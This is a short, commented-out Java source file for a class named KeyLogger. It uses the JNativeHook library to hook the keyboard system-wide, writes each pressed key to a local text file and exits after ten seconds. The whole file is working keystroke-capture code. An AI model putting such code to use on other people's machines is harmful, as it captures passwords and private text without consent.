//package function;
//
//import java.io.File;
//import java.io.FileNotFoundException;
//import java.io.FileOutputStream;
//import java.io.PrintStream;
//import java.util.Timer;
//import java.util.TimerTask;
//
//import org.jnativehook.GlobalScreen;
//import org.jnativehook.NativeHookException;
//import org.jnativehook.keyboard.NativeKeyEvent;
//import org.jnativehook.keyboard.NativeKeyListener;
//
//public class KeyLogger implements NativeKeyListener {
//
//    public KeyLogger() {
//        new Timer().schedule(new TimerTask() {
//            public void run() {
//                // Terminate the program
//                System.exit(0);
//            }
//        }, 10000); // Set the timer duration to 10 seconds (10000 milliseconds)
//        try {
//            File file = new File("output_file.txt");
//            if (file.exists()) {
//                file.delete(); // Delete if exists
//            }
//            FileOutputStream fos = new FileOutputStream(file, true);
//            System.setOut(new PrintStream(fos));
//        } catch (FileNotFoundException e1) {
//            e1.printStackTrace();
//        }
//        try {
//            GlobalScreen.registerNativeHook();
//        } catch (NativeHookException e) {
//            e.printStackTrace();
//        }
//        GlobalScreen.getInstance().addNativeKeyListener(this);
//    }
//
//    public void nativeKeyPressed(NativeKeyEvent e) {
//        System.out.println("Pressed:" + NativeKeyEvent.getKeyText(e.getKeyCode()));
//    }
//
//    public void nativeKeyReleased(NativeKeyEvent arg0) {
//    }
//
//    public void nativeKeyTyped(NativeKeyEvent arg0) {
//    }
//
//    public static void main(String[] args) {
//        new KeyLogger();
//    }
//
//}
